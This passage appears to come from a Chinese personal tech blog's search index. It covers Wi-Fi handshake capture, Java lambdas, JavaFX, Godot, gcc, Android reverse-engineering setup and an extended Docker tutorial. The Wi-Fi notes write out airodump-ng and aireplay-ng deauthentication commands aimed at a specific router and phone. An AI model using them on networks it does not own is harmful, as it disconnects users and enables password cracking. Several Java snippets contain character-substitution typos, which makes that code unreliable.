UTP-8**，空格选择，按tab键选择ok\n\n在此处选择zh_CN.UTF-8字符编码，在<0k> 处按空格键进行确认\n\n![](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202306241325766.png)\n\n然后重启\n\n## 握手包捕获\n\n先将网卡连接到虚拟机\n\n先查看当前的网卡设备，后面带有 usb的就是嗅探的网卡\n\n```bash\nairmon-ng  #查看当前的网卡设备\n```\n\n\n\n![](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202306241332137.png)\n\n将网卡切换至监听模式\n\n```bash\nairmon-ng start wlan0 ## start后面跟设备的接口名\n```\n\n再用airmon-ng命令查看，当设备名后面多了个**mon**的后缀就表示已经切换至监听状态了\n\n![](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202306241334541.png)\n\n查看当前所有的热点信息\n\n```bash\nairodump-ng wlan0mon  ## 后面跟监听网卡的接口名\n```\n\n![](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202306241340725.png)\n\n开始捕获握手包\n\n以下 -c 指定信道 对应CH  -w 指定写入文件，最后跟要使用的网卡设备\n\n```shell\nairodump-ng -c 1 --bssid B0:45:02:D2:B7:14 -w shaoyu wlan0mon\n```\n\n在捕获的同时使用断网攻击\n\n-0 指定攻击等级，-a 指定热点源，一般是是路由器wifi，-c 指定客户端，一般是手机\n\n```bash\naireplay-ng -0 10 -a B0:45:02:D2:B7:14 -c 7C:D6:61:85:FD:BF wlan0mon\n```\n\n## ESWA万能破解\n\n","tags":["安全记录"]},{"title":"Java函数式编程","url":"/2025/01/12/Java函数式编程/","content":"\n# Lambda表达式\n\n## 概述\n\n​\tLambda是JDK8中一个语法糖。他可以对某些匿名内部类的写法进行简化。它是函数式编程思想的一个重要体现。让我们不用关注是什么对象。而是更关注我们对数据进行了什么操作。\n\n## 核心原则\n\n可推导可省略\n\n## 基本格式\n\n```\n(参数列表)->{代码}\n```\n\n**使用Lambda表达式的重要前提是必须有接口,且该接口只有一个抽象方法（也称为函数式接口）**\n\n例1：\n\n```java\nnew Thread(new Runnab1e( {\n    @Override\n    pub1ic void run(){\n    \tSystem.out.println(\"你知道吗我比你想象的更想在你身边\");\n    }\n}).start();\n\n```\n\n改写后：\n\n```java\nnew Thread(()->{\n    \tSystem.out.println(\"你知道吗我比你想象的更想在你身边\");\n\t}\n).start();\n```\n\n# Stream流\n\n## 概述\n\n​\tJava8的Stream使用的是函数式编程模式，如同它的名字一样，它可以被用来对集合或数组进行链状流式的操作。可以更方便的让我们对集合或数组操作。\n\n```java\n@Data\n@NoArgsConstructor\n@AllArgsConstructor\n@EqualsAndHashcode //用于后期的去重使用\npublic c1ass Author {\n    //id\n    private Long id;\n    //姓名\n    private string name;\n    //年龄\n    private Integer age;\n    //简介\n    private string intro;\n    //作品\n    private List<Book> books;\n}\n\n```\n\n## 快速入门\n\n```java\n//打印所有年龄小于18的作家的名字，并且要注意去重\nList<Author> authors = getAuthors();\nauthors.\n\tstream()//把集合转换成流\n\t.distinct()//先去除重复的作家|\n\t.fi1ter(author -> author . getAge()<18)//筛选年龄小于18的\n\t.forEach(author -> System.out.print1n(author . getName() );//遍历打印名字\n\n```\n\n```java\n@SpringBootTest()\npublic class TestDemo {\n\n    @Test\n    public void test(){\n        List<Student> list = new ArrayList<>();\n        Student student = new Student(\"muouren7\",16);\n        Student student1 = new Student(\"muouren7\",16);\n        Student student2 = new Student(\"muouren2\",11);\n        Student student3 = new Student(\"muouren3\",20);\n        Student student4 = new Student(\"muouren4\",130);\n        list.add(student);\n        list.add(student1);\n        list.add(student2);\n        list.add(student3);\n        list.add(student4);\n\n        list.stream()\n                .distinct()\n                .forEach(s->{\n                    System.out.println(s.getLastName()+s.getAge());\n                });\n    }\n}\n\n/*\n打印结果\n    muouren716\n    muouren211\n    muouren320\n    muouren4130\n*/\n```\n\n# Optional\n\n示例\n\n```java\n@SpringBootTest()\npublic class TestDemo {\n\n    @Test\n    public void test(){\n        Optional<Student> SS = Optional.ofNullable(new Student(\"muouren7\",17));\n        SS.ifPresent(s->{\n            System.out.println(s.getLastName()+s.getAge());\n        });\n    }\n}\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["Lambda","函数式编程"]},{"title":"JavaFx笔记","url":"/2025/01/12/JavaFx笔记/","content":"\n## JavaFx环境配置\n\n1、下载JavaFx的SDK[JavaFx中文网]([JavaFX - Gluon (gluonhq.com)](https://gluonhq.com/products/javafx/))，并解压\n\n2、IDEA创建新的Java项目，然后将解压后的JavaFx的SDK中的lib目录下所有的Jar包复制到项目下\n\n![jar包](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202304212116568.png)\n\n3、在IDEA中，选择文件 -> 项目结构 -> 库，然后把SDK中所有的Jar包选中\n\n![添加](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202304212120989.png)\n\n4、然后创建一个类，加入以下代码。\n\n```java\npublic class JavaFxMain extends Application {\n    @Override\n    public void start(Stage primaryStage) throws Exception {\n        primaryStage.setTitle(\"这是我的第一个JavaFx程序\");\n        primaryStage.setMaxHeight(400);\n        primaryStage.setMaxWidth(400);\n        primaryStage.show();\n    }\n\n    public static void main(String[] args) {\n        launch();\n    }\n}\n```\n\n5、进行启动配置，在程序实参部分加入以下代码，其中**D:\\Path\\JavaFxSdk\\openjfx-17.0.7_windows-x64_bin-sdk\\javafx-sdk-17.0.7\\lib**部分即下载的SDK的存储位置，一定要到lib目录，配置完成后，重新添加应用的运行环境即可。\n\n```shell\n--module-path \"D:\\Path\\JavaFxSdk\\openjfx-17.0.7_windows-x64_bin-sdk\\javafx-sdk-17.0.7\\lib\" --add-modules javafx.controls,javafx.fxml\n```\n\n\n\n![配置](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202304212128601.png)\n\n6、完成上述步骤后，点击运行，出现白色的窗口即说明配置完成。\n\n![运行](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202304212132114.png)\n\n## 概述\n\nJavaFx整体包括**Stages 舞台** **Scenes 场景** **Scene Graphs 布局** 以及控件(布局之中才是控件)\n\n![架构](https://cdn.nlark.com/yuque/0/2022/png/23145762/1650784177227-de6afb5c-7190-4e3e-9a24-a899ef74d504.png?x-oss-process=image%2Fresize%2Cw_382%2Climit_0)\n\n### 场景、布局、控件简单示例\n\n```java\npublic class JavaFxMain extends Application {\n\n    @Override\n    public void start(Stage primaryStage) throws Exception {\n        //舞台设置标题\n        primaryStage.setTitle(\"测试javaFx\");\n        //布局\n        HBox hBox = new HBox();\n        //控件\n        Button button = new Button(\"登录\");\n        //将控件添加到布局中\n        hBox.getChildren().add(button);\n\n        //场景\n        Scene scene = new Scene(hBox, 450, 250);\n        //将场景添加到舞台中\n        primaryStage.setScene(scene);\n        //展示舞台\n        primaryStage.show();\n    }\n\n    public static void main(String[] args) {\n        launch();\n    }\n}\n```\n\n效果\n\n![效果](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202304212153337.png)\n\n\n\n​\t其他笔记\n\n[在线文档]([JavaFX 概述 (yuque.com)](https://www.yuque.com/chengxuyuanyideng/wmiqe2/kl9uvp))\n\n\n\n## 舞台\n\n\n\n\n\n\n\n","tags":["JavaFx"]},{"title":"Godot学习记录（更新中）","url":"/2025/01/12/Godot学习记录/","content":"\n[Godot官网](https://godotengine.org/)\n\n[Godot 3.5 中文文档](https://docs.godotengine.org/zh_CN/latest/)\n\n该记录使用的Godot 3.5.2版本\n\n# Hello World\n\n创建好项目后，点击新建2D节点\n\n![](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202306222146463.png)\n\n选中新建的节点，，然后点击上侧的添加脚本按钮\n\n![](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202306222148469.png)\n\n![](C:\\Users\\muouren7\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230622214949935.png)\n\n在脚本中输入以下代码，在控制台打印HelloWorld\n\n```go\nextends Node2D\n\nfunc _ready():\n\tprint(\"Hello World\")\n\tpass \n\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["godot"]},{"title":"C++笔记","url":"/2025/01/12/C++笔记/","content":"\n","tags":["C++"]},{"title":"C++","url":"/2025/01/12/C++/","content":"\n\n\n\n\n\n\n\n\n### GCC命令\n\n```powershell\ngcc -fexec-charset=GBK -I head test.c func.c newfunc.c -o aaa\n```\n\n**-fexec-charset=GBK** 指定输出编译后的二进制文件编码格式，GBK和windows系统默认的编码格式保持一致，不带参数默认是utf-8，会乱码，\n\n**-I** 指定头文件所在的文件夹\n\n**-o** 指定链接后的可执行文件\n","tags":["C++","gcc"]},{"title":"Android逆向(未完成)","url":"/2025/01/12/Android逆向(未完成)/","content":"\n[原文链接《安卓逆向这档事》一、模拟器环境搭建 - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn](https://www.52pojie.cn/thread-1695141-1-1.html)\n\n## 环境搭建\n\n准备：\n\n- 雷电模拟器9.0\n- [Magisk面具模块](https://yzhqvq.lanzoux.com/b02vfzqmh)：密码：52pj\n- [LSPosed模块](https://[github](http://search.bilibili.com/all?from_source=webcommentline_search&keyword=github).com/LSPosed/LSPosed/releases/download/v1.8.6/LSPosed-v1.8.6-6712-zygisk-release.zip)\n\n首先下载安装雷电模拟器，在设置中勾选**System.vmdk**可写入，然后把模拟器的Root权限打开\n\n<img src=\"https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202304271559460.png\"  />\n\n![](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202304271600506.png)\n\n然后安装Magisk模块，直接拖进模拟器双击即可。\n\n![](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202304271603942.png)\n\n![](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202304271604743.png)\n\n需要注意的是，在进入到以下界面后暂时先不要动。先把Magisk关闭再重启。\n\n![](C:\\Users\\HP\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230427160605891.png)\n\n然后重新进入安装界面。把两项都选上。\n\n![](C:\\Users\\HP\\AppData\\Roaming\\Typora\\typora-user-images\\image-20230427160733807.png)\n\n\n\n方式选择**系统分区**\n\n![](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202304271607654.png)\n\n出现了以下信息就说明Magisk安装成功了。成功后需要再次重启模拟器。\n\n![](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202304271609651.png)\n\n\n\n重启后进入到Magisk，在设置中把以下这一项勾选上。\n\n![](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202304271610086.png)\n\n然后准备安装LSPosed模块，在模拟器旁边有一个共享文件的选项，选择，将真机中下载好的LSPosed模拟导入到模拟器中（默认导入到模拟器的Picture文件夹下）。\n\n然后进入Magisk，在模块一项中选择安装LSPosed模块，安装完成后选择重启\n\n如果能看见以下信息，就说明我们的环境搭建完成了。\n\n![](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202304271613345.png)\n\n## Apk文件结构、双开、汉化\n\n### apk结构\n\napk 全称 Android Package，它相当于一个压缩文件，只要在电脑上将apk后缀改为zip即可解压。\n\n| 文件                    | 注释                                                         |\n| ----------------------- | ------------------------------------------------------------ |\n| assets目录              | 存放APK的静态资源文件，比如视频，音频，图片等                |\n| lib 目录                | armeabi-v7a基本通用所有android设备，arm64-v8a只适用于64位的android设备，x86常见用于android模拟器，其目录下的.so文件是c或c++编译的动态链接库文件 |\n| META-INF目录            | 保存应用的签名信息，签名信息可以验证APK文件的完整性，相当于APK的身份证(验证文件是否又被修改) |\n| res目录                 | res目录存放资源文件，包括图片，字符串等等，APK的脸蛋由他的layout文件设计 |\n| AndroidMainfest.xml文件 | APK的应用清单信息，它描述了应用的名字，版本，权限，引用的库文件等等信息 |\n| classes.dex文件         | classes.dex是java源码编译后生成的java字节码文件，APK运行的主要逻辑 |\n| resources.arsc文件      | resources.arsc是编译后的二进制资源文件，它是一个映射表，映射着资源和id，通过R文件中的id就可以找到对应的资源 |\n\n\n\n#### 汉化\n\n![](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202306261031493.png)\n\n\n\n以不包含壳的apk为例，若要将以下信息修改为中文，先在 **mt管理器** 中进行查看，使用开发者助手选中这段文字，\n\n![](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202306261106622.png)\n\n![](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202306261107324.png)\n\n![](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202306261108272.png)\n\n选中对应的文本进行复制\n\n![](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202306261109551.png)\n\n然后在Mt管理器中进行全局搜索（选中高级）\n\n![](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202306261110319.png)\n\n找到对应的dex文件或arsc文件，点进去 修改就行了\n\n![](https://muouren7hexo-1305003515.cos.ap-chengdu.myqcloud.com/HexoPic/202306261132802.png)\n","tags":["Android","逆向"]},{"title":"Docker常用命令","url":"/2022/10/20/docker-chang-yong-ming-ling/","content":"##拉取镜像\n```shell\ndocker pull hello-world\n```","tags":["Docker"]},{"title":"Vue项目页面上方有空白","url":"/2022/10/14/vue-xiang-mu/","content":"\n\n# Vue项目页面上方有空白（解决方案）\n## 问题\n新建的vue项目，里面的每个页面中，上方都有几像素的空白\n![解决前](https://raw.githubusercontent.com/muouren7/PIC/master/img/202209150953701.png)\n## 解决\n在vue项目下的App.vue中，样式表的顶部外边距默认是60像素,会将页面的body元素与html隔开,将样式表的顶部外边距改位0px即可\n```css\n#app {\n  margin-top: 60px;\n}\n```\n![解决后](https://raw.githubusercontent.com/muouren7/PIC/master/img/202209150956088.png)\n改了之后就没有空白了。","tags":["vue"]},{"title":"Docker容器技术","url":"/2022/10/14/Docker容器技术/","content":"\n\n\n![image-20220629215534772](https://s2.loli.net/2022/06/29/bnXgrjtzkx7YaLo.png)\n\n# Docker容器技术\n\nDocker是一门平台级别的技术，涉及的范围很广，所以，在开始之前，请确保你完成：**Java SpringBoot 篇**（推荐完成SpringCloud篇再来）视频教程及之前全部路线，否则学习会非常吃力，另外推荐额外掌握：《计算机网络》、《操作系统》相关知识。学一样东西不能完全靠记忆来完成，而是需要结合自己所学的基础知识加以理解，一般来说，单凭记忆能够掌握的东西往往是最廉价的。\n\n**Docker官网：**https://www.docker.com\n\n**课前准备：**配置2C2G以上Linux服务器一台，云服务器、虚拟机均可。\n\n## 容器技术入门\n\n随着时代的发展，Docker也逐渐走上了历史舞台，曾经我们想要安装一套环境，需要花费一下午甚至一整天来配置和安装各个部分（比如运行我们自己的SpringBoot应用程序，可能需要安装数据库、安装Redis、安装MQ等，各种各样的环境光是安装就要花费很多时间，真的是搞得心态爆炸），而有了Docker之后，我们的程序和环境部署就变得非常简单了，我们只需要将这些环境一起打包成一个镜像。而到服务器上部署时，可以直接下载镜像实现一键部署，是不是很方便？\n\n包括我们在学习SpringCloud需要配置的各种组件，可能在自己电脑的环境中运行会遇到各种各样的问题（可能由于电脑上各种环境没配置，导致无法运行），而现在只需要下载镜像就能直接运行，所有的环境全部在镜像中配置完成，开箱即用。\n\n真的有这么神奇吗？我们来试试看。\n\n### 环境安装和部署\n\n首先我们还是先将Docker环境搭建好（建议和我同一个环境，不然出了问题只能自己想办法了），这里我们使用：\n\n* Ubuntu 22.04 操作系统\n\nDocker分为免费的CE（Community Edition）社区版本和EE（Enterprise Edition）企业级付费版本，所以我们这里选择docker-ce进行安装。官方安装文档：https://docs.docker.com/engine/install/ubuntu/\n\n首先安装一些工具：\n\n```sh\nsudo apt-get install ca-certificates curl gnupg lsb-release\n```\n\n不过在Ubuntu22.04已经默认安装好了。接着安装官方的GPG key：\n\n```sh\nsudo mkdir -p /etc/apt/keyrings\n\ncurl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg\n```\n\n最后将Docker的库添加到apt资源列表中：\n\n```sh\necho \"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null\n```\n\n接着我们更新一次apt：\n\n```sh\n sudo apt update\n```\n\n最后安装Docker CE版本：\n\n```sh\n sudo apt install docker-ce\n```\n\n等待安装完成就可以了：\n\n![image-20220630161240162](https://s2.loli.net/2022/06/30/D1GXAQdUsgmTawq.png)\n\n![image-20220630161341541](https://s2.loli.net/2022/06/30/oI26yQiqhABN3UP.png)\n\n可以看到安装成功后版本是20.10.17，当然可能你们安装的时候就是更新的版本了。最后我们将当前用户添加到docker用户组中，不然每次使用docker命令都需要sudo执行，很麻烦：\n\n```sh\nsudo usermod -aG docker <用户名>\n```\n\n配置好后，我们先退出SSH终端，然后重新连接就可以生效了。\n\n这样我们Docker 的学习环境就配置好了，现在我们就尝试通过Docker来部署一个Nginx服务器试试看，使用很简单，只需要一个命令就可以了（当然现在看不懂没关系，我们后面会细嗦）：\n\n```sh\nsudo docker run -d -p 80:80 nginx\n```\n\n![image-20220630165259663](https://s2.loli.net/2022/06/30/sPVpLI9bXlzdKeO.png)\n\n首选它会从镜像仓库中下载对应的镜像，国内访问速度还行，不需要单独配置镜像源。接着下载完成后，就会在后台运行了，我们可以使用浏览器访问试试看：\n\n![image-20220630165430159](https://s2.loli.net/2022/06/30/fP5TsQnqUbmXoaA.png)\n\n![image-20220630165440751](https://s2.loli.net/2022/06/30/lPZYrUn2D1gNjx8.png)\n\n可以看到，Nginx服务器已经成功部署了，但是实际上我们并没有在Ubuntu中安装Nginx，而是通过Docker运行的镜像来进行服务器搭建的，是不是感觉玩法挺新奇的。除了Nginx这种简单的应用之外，我们还可以通过Docker来部署复杂应用，之后我们都会一一进行讲解的。\n\n### 从虚拟机到容器\n\n前面我们成功安装了Docker学习环境，以及浅尝了一下Docker为我们带来的应用快速部署。在正式进入学习之前，我们就先从Docker的发展开始说起。\n\n在Docker出现之前，虚拟化技术可以说是占据了主导地位。首先我们来谈谈为什么会出现虚拟化技术，我们知道在企业中服务器可以说是必不可少的一种硬件设施了，服务器也是电脑，但是不像我们的家用电脑，服务器的配置是非常高的，我们家用电脑的CPU可能最高配也就20核了，内存很少有超过128G的电脑，64G内存的家用电脑可以算奢侈了。而服务器不一样，服务器级别的CPU动辄12核，甚至服务器还能同时安装多块CPU，能直接堆到好几十核：\n\n![image-20220630171220207](https://s2.loli.net/2022/06/30/DPxA9MsZ3WGl62X.png)\n\n我们家用级CPU一般是AMD的锐龙系列和Intel的酷睿系列（比如i3 i5 i7 i9），而服务器CPU一般是Intel的志强（Xeno）系列，这种CPU的特点就是核心数非常多：\n\n![image-20220630172135408](https://s2.loli.net/2022/06/30/cKlhRZ9Sw1Q4uEX.png)\n\n并且服务器CPU相比家用CPU的功耗也会更大，因此服务器CPU的发热量非常高，如果你有幸去过机房，你会听见散热风扇猛烈转动的声音（但是服务器CPU的频率没有家用级CPU高，一般大型游戏要求的是高频率而不是核心数，而且功耗也比较大，所以并不适合做家用电脑，所以以后在网上买台式机，看到什么“i9级”CPU千万别买，是这些黑心商家把国外服务器上淘汰下来的服务器CPU（洋垃圾）装成电脑卖给你，所以会很便宜，同时核心数又能媲美i9，所以还是一分钱一分货实在）\n\n服务器无论是CPU资源还是内存资源都远超家用电脑，而我们编写的Java后端项目，最后都会运行在这些服务器上，不过有一个问题，服务器既然有这么丰富的硬件资源，就跑咱们这一个小Java后端，是不是有点核弹炸蚊子的感觉了？可能顶多就用了服务器5%的硬件资源，服务器这么牛就运行个这也太浪费了吧。\n\n所以，为了解决这种资源利用率只有5%-15%的情况，咱们能不能想个办法，把这一台服务器分成多个小服务器使用，每个小服务器只分配一部分的资源，比如分一个小服务器出去，只给2个CPU核心和4G内存。但是由于设计上的问题，我们的电脑只能同时运行一个操作系统，那么怎么办呢？此时虚拟化技术就开始兴起了。\n\n虚拟化使用软件来模拟硬件并创建虚拟计算机系统。这样一来，企业便可以在单台服务器上运行多个虚拟系统，也就是运行多个操作系统和应用，而这可以实现规模经济以及提高效益。比如我们电脑上经常使用的VMware就是一种民用级虚拟化软件：\n\n![image-20220630173915254](https://s2.loli.net/2022/06/30/St3hfELQHNdRZmA.png)\n\n我们可以使用VMware来创建虚拟机，这些虚拟机实际上都是基于我们当前系统上的VMware软件来运行的，当然VMware也有服务器专用的虚拟化软件，有了虚拟化之后，我们的服务器就像这样：\n\n![image-20220630174945749](https://s2.loli.net/2022/06/30/BmnC1xETQM4uRHO.png)\n\n相当于通过虚拟机模拟了很多来电脑出来，这样我们就可以在划分出来的多台虚拟机上分别安装系统和部署我们的应用程序了，并且我们可以自由分配硬件资源，合理地使用。一般在企业中，不同的应用程序可能会被分别部署到各个服务器上，隔离开来，此时使用虚拟机就非常适合。\n\n实际上我们在什么腾讯云、阿里云租的云服务器，都是经过虚拟化技术划分出来的虚拟机而已。\n\n那么，既然虚拟机都这么方便了，容器又是怎么杀出一条血路的呢？我们先来看看什么是容器。\n\n容器和虚拟机比较类似，都可以为应用提供封装和隔离，都是软件，但是容器中的应用运行是寄托于宿主操作系统的，实际上依然是在直接使用操作系统的资源，当然应用程序之间环境依然是隔离的，而虚拟机则是完全模拟一台真正的电脑出来，直接就是两台不同的电脑。\n\n![image-20220630181037698](https://s2.loli.net/2022/06/30/31GZSh5DE9Vilet.png)\n\n因此容器相比虚拟机就简单多了，并且启动速度也会快很多，开销小了不少。\n\n不过容器火的根本原因还是它的集装箱思想，我们知道，如果我们要写一个比如论坛、电商这类的Java项目，那么数据库、消息队列、缓存这类中间件是必不可少的，因此我们如果想要将一个服务部署到服务器，那么实际上还要提前准备好各种各样的环境，先安装好MySQL、Redis、RabbitMQ等应用，配置好了环境，再将我们的Java应用程序启动，整个流程下来，光是配置环境就要浪费大量的时间，如果是大型的分布式项目，可能要部署很多台机器，那岂不是我们得一个一个来？项目上个线就要花几天时间，显然是很荒唐的。\n\n而容器可以打包整个环境，比较MySQL、Redis等以及我们的Java应用程序，可以被一起打包为一个镜像，当我们需要部署服务时，只需要像我们之前那样，直接下载镜像运行即可，不需要再进行额外的配置了，整个镜像中环境是已经配置好的状态，开箱即用。\n\n![image-20220630182136717](https://s2.loli.net/2022/06/30/NTnU8iSj51CspFw.png)\n\n而我们要重点介绍的就是Docker了，可以看到它的图标就是一只鲸鱼，鲸鱼的上面是很多个集装箱，每个集装箱就是我们的整个环境+应用程序，Docker可以将任何应用及其依赖打包为一个轻量级，可移植，自包含的容器，容器可以运行在几乎所有的操作系统上。\n\n### 容器工作机制简述\n\n我们先来看看Docker的整体架构：\n\n![image-20220630184857540](https://s2.loli.net/2022/06/30/PeaxwNQXkiYSlUv.png)\n\n实际上分为三个部分：\n\n* Docker 客户端：也就是我们之前使用的docker命令，都是在客户端上执行的，操作会发送到服务端上处理。\n* Docker 服务端：服务端就是启动容器的主体了，一般是作为服务在后台运行，支持远程连接。\n* Registry：是存放Docker镜像的仓库，跟Maven一样，也可以分公有和私有仓库，镜像可以从仓库下载到本地存放。\n\n当我们需要在服务器上部署一个已经打包好的应用和环境，我们只需要下载打包好的镜像就可以了，我们前面执行了：\n\n```sh\nsudo docker run -d -p 80:80 nginx\n```\n\n实际上这个命令输入之后：\n\n1. Docker客户端将操作发送给服务端，告诉服务端我们要运行nginx这个镜像。\n2. Docker服务端先看看本地有没有这个镜像，发现没有。\n3. 接着只能从公共仓库Docker Hub去查找下载镜像了。\n4. 下载完成，镜像成功保存到本地。\n5. Docker服务端加载Nginx镜像，启动容器开始正常运行（注意容器和其他容器之间，和外部之间，都是隔离的，互不影响）\n\n所以，整个流程中，Docker就像是一搜运输船，镜像就像是集装箱，通过运输船将世界各地的货物送往我们的港口，货物到达港口后，Docker并不关心集装箱里面的是什么，只需要创建容器开箱即用就可以了。相比我们传统的手动安装配置环境，不知道方便了几个层次。\n\n不过容器依然是寄托于宿主主机的运行的，所以一般在生产环境下，都是通过虚拟化先创建多台主机，然后再到各个虚拟机中部署Docker，这样的话，运维效率就大大提升了。\n\n从下一章开始，我们就正式地来学习一下Docker的各种操作。\n\n***\n\n## 容器与镜像\n\n要启动容器最关键的就是镜像，我们来看看镜像相关的介绍。\n\n### 初识容器镜像\n\n首先我们来了解一下镜像的相关操作，比如现在我们希望把某个镜像从仓库下载到本地，这里使用官方的hello-world镜像：\n\n```sh\ndocker pull hello-world\n```\n\n只需要输入`pull`命令，就可以直接下载到指定的镜像了：\n\n![image-20220701111043417](https://s2.loli.net/2022/07/01/tZ4S2HYvNKr7qiD.png)\n\n可以看到对上面一行有一句Using default tag，实际上一个镜像的名称是由两部分组成的，一个是`repository`，还有一个是`tag`，一般情况下约定`repository`就是镜像名称，`tag`作为版本，默认为latest，表示最新版本。所以指定版本运行的话：\n\n```sh\ndocker pull 名称:版本\n```\n\n之后为了教学方便，我们就直接使用默认的tag，不去指定版本了。\n\n镜像下载之后会存放在本地，要启动这个镜像的容器，实际上就像我们之前那样，输入`run`命令就可以了：\n\n```sh\ndocker run hello-world\n```\n\n当然如果仅仅是只想创建而不想马上运行的话，可以使用`create`命令：\n\n```sh\ndocker create hello-world\n```\n\n可以看到成功启动了：\n\n![image-20220701111314331](https://s2.loli.net/2022/07/01/Brl4cnK8WsjP7LV.png)\n\n启动之后，会使用当前镜像自动创建一个容器，我们可以输入`ps`命令来查看当前容器的容器列表：\n\n```\ndocker ps -a\n```\n\n注意后面要加一个`-a`表示查看所有容器（其他选项可以使用-h查看），如果不加的话，只会显示当前正在运行的容器，而HelloWorld是一次性的不是Nginx那样的常驻程序，所以容器启动打印了上面的内容之后，容器就停止运行了：\n\n![image-20220701111840091](https://s2.loli.net/2022/07/01/zMN3TPR7aHu5YGb.png)\n\n可以看到容器列表中有我们刚刚创建的hello-world以及我们之前创建的nginx（注意同一个镜像可以创建多个容器），每个容器都有一个随机生成的容器ID写在最前面，后面是容器的创建时间以及当前的运行状态，最后一列是容器的名称，在创建容器时，名称可以由我们指定也可以自动生成，这里就是自动生成的。\n\n我们可以手动指定名称启动，在使用`run`命令时，添加`--name`参数即可：\n\n```sh\ndocker run --name=lbwnb hello-world\n```\n\n![image-20220701125951980](https://s2.loli.net/2022/07/01/qOblnhr5CJiIBG6.png)\n\n我们可以手动开启处于停止状态的容器：\n\n```sh\n docker start <容器名称/容器ID>\n```\n\n注意启动的对象我们要填写容器的ID或是容器的名称才可以，容器ID比较长，可以不写全只写一半，但是你要保证你输入的不完全容器ID是唯一的。\n\n![image-20220701124845982](https://s2.loli.net/2022/07/01/XfFORtqhK9lcBi7.png)\n\n如果想要停止容器直接输入`stop`命令就可以了：\n\n```sh\n docker stop <容器名称/容器ID>\n```\n\n或是重启：\n\n```sh\n docker restart <容器名称/容器ID>\n```\n\n![image-20220701125025173](https://s2.loli.net/2022/07/01/Q2tor6KRIeUEhO4.png)\n\n如果我们不需要使用容器了，那么可以将容器删除，但是注意只有容器处于非运行状态时才可以删除：\n\n```sh\ndocker rm <容器名称/容器ID>\n```\n\n当然如果我们希望容器在停止后自动删除，我们可以在运行时添加`--rm`参数：\n\n```sh\ndocker run --rm 镜像名称\n```\n\n![image-20220701125108834](https://s2.loli.net/2022/07/01/3MlPUpjoV1Qg8DX.png)\n\n删除后，容器将不复存在，当没有任何关于nginx的容器之后，我们可以删除nginx的本地镜像：\n\n![image-20220701125204728](https://s2.loli.net/2022/07/01/bmHqND36yCUBPVj.png)\n\n我们可以使用`images`命令来检查一下当前本地有那些镜像：\n\n```sh\ndocker images\n```\n\n![image-20220701125514145](https://s2.loli.net/2022/07/01/fEscbGJXw4e7YFK.png)\n\n至此，我们已经了解了Docker的简单使用，在后面的学习中，我们还会继续认识更多的玩法。\n\n### 镜像结构介绍\n\n前面我们了解了Docker的相关基本操作，实际上容器的基石就是镜像，有了镜像才能创建对应的容器实例，那么我们就先从镜像的基本结构开始说起，我们来看看镜像到底是个什么样的存在。\n\n我们在打包项目时，实际上往往需要一个基本的操作系统环境，这样我们才可以在这个操作系统上安装各种依赖软件，比如数据库、缓存等，像这种基本的系统镜像，我们称为base镜像，我们的项目之后都会基于base镜像进行打包，当然也可以不需要base镜像，仅仅是基于当前操作系统去执行简单的命令，比如我们之前使用的hello-world就是。\n\n一般base镜像就是各个Linux操作系统的发行版，比如我们正在使用的Ubuntu，还有CentOS、Kali等等。这里我们就下载一下CentOS的base镜像：\n\n```sh\ndocker pull centos\n```\n\n![image-20220701132622893](https://s2.loli.net/2022/07/01/oFKxiMzA3fs2aIl.png)\n\n可以看到，CentOS的base镜像就已经下载完成，不像我们使用完整系统一样，base镜像的CentOS省去了内核，所以大小只有272M，这里需要解释一下base镜像的机制：\n\n![image-20220701133111829](https://s2.loli.net/2022/07/01/dvmqAjKHkucbLFh.png)\n\nLinux操作体系由内核空间和用户空间组成，其中内核空间就是整个Linux系统的核心，Linux启动后首先会加`bootfs`文件系统，加载完成后会自动卸载掉，之后会加载用户空间的文件系统，这一层是我们自己可以进行操作的部分：\n\n* 